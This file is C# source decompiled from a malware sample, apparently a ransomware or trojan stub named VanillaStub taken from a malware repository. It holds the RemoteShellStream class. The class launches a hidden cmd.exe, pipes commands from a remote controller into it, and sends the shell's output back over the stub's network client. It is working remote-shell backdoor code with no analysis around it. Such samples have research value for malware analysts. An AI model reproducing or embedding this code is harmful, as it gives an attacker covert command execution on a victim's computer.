// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.RemoteShellStream
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Permissions;
using System.Text;
using System.Threading;

namespace VanillaStub.Helpers.Services
{
  public static class RemoteShellStream
  {
    private static Thread RemoteShellThread = new Thread(new ThreadStart(RemoteShellStream.StartRemoteShell));

    private static bool RemoteShellActive { get; set; }

    private static string LastInput { get; set; }

    public static string Input { get; set; }

    public static bool WriteLine { get; set; }

    [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
    public static void Start()
    {
      if (RemoteShellStream.RemoteShellActive)
        return;
      RemoteShellStream.RemoteShellActive = true;
      try
      {
        RemoteShellStream.RemoteShellThread.Start();
      }
      catch
      {
      }
    }

    [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
    public static void Stop()
    {
      if (!RemoteShellStream.RemoteShellActive)
        return;
      RemoteShellStream.RemoteShellActive = false;
      try
      {
        RemoteShellStream.RemoteShellThread.Abort();
        RemoteShellStream.RemoteShellThread = new Thread(new ThreadStart(RemoteShellStream.StartRemoteShell));
      }
      catch
      {
      }
    }

    private static void StartRemoteShell()
    {
      Process process = new Process();
      process.StartInfo.FileName = "cmd.exe";
      process.StartInfo.CreateNoWindow = true;
      process.StartInfo.UseShellExecute = false;
      process.StartInfo.RedirectStandardOutput = true;
      process.StartInfo.RedirectStandardInput = true;
      process.StartInfo.RedirectStandardError = true;
      process.OutputDataReceived += new DataReceivedEventHandler(RemoteShellStream.OutputHandler);
      process.Start();
      process.BeginOutputReadLine();
      while (RemoteShellStream.RemoteShellActive)
      {
        if (RemoteShellStream.WriteLine)
        {
          RemoteShellStream.LastInput = RemoteShellStream.Input;
          process.StandardInput.WriteLine(RemoteShellStream.Input);
          RemoteShellStream.WriteLine = false;
        }
      }
    }

    private static void OutputHandler(object SendingProcess, DataReceivedEventArgs OutData)
    {
      StringBuilder stringBuilder = new StringBuilder();
      if (string.IsNullOrEmpty(OutData.Data))
        return;
      try
      {
        stringBuilder.Append(OutData.Data);
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 18);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(stringBuilder.ToString()));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
      }
      catch
      {
      }
    }
  }
}
